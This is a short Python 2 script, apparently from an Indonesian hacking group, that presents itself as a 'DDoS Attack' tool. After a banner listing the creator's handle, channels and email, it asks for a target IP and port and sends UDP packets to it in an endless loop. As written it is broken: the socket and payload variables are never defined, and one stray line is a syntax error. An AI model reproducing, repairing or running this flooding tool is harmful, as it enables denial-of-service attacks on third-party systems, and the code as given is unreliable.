import sys
import os
import time
import socket
import random
#Perlengkapan Tempur :v
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
Ali Attacker
#############

os.system("clear")
os.system("figlet DDoS Attack Anonymous All Indonesia")
print
print "Creator   : Kandol Tersakiti"
print "Thanks To : Ali Attacker"
print "You Tube  : https://www.youtube.com/channel/UCOe7cOMZJSLtXsSuGUsrrcQ ( Anonymous All Indonesia )"
print "Blogspot  : https://aliattackerteam.blogspot.com"
print "Github    : https://github.com/Kandol"
print "Email     : kandoljr701@gmail.com"
print "Team.     : Ali Attacker"
print
ip = raw_input("Masukkan IP Target : ")
port = input("Masukkan Port      : ")

os.system("clear")
os.system("figlet Dimulai")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 0
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 0
